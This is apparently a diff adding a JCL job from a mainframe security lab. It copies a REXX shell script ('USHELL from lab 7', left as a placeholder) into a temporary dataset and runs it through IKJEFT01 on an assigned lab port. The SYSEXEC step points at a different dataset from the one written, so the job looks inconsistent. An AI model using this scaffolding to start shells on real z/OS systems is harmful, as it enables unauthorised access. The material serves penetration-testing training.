@@ -1,0 +1,18 @@
+//CREATERX  EXEC PGM=IEBGENER
+//SYSPRINT   DD SYSOUT=*
+//SYSIN      DD DUMMY
+//SYSOUT     DD SYSOUT=*
+//SYSUT2      DD DSN=&&OMG(SHELLED),
+//           DISP=(NEW,PASS),SPACE=(TRK,(5,5,5)),
+//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT1      DD *
+<place contents of USHELL from lab 7 here>
+//* End of REXX script
+Then add the IKJEFT01 step below after the REXX script and replace it to make it look like this
+Note Make sure you replace <port> with your assigned port (40000-40030)
+//EXECREXX EXEC PGM=IKJEFT01,
+//            PARM='%SHELLED <port>',
+//            REGION=0M
+//SYSTSIN  DD  DUMMY
+//SYSTSPRT DD  SYSOUT=*
+//SYSEXEC  DD  DSN=&&TEMP,DISP=(OLD,DELETE,DELETE)
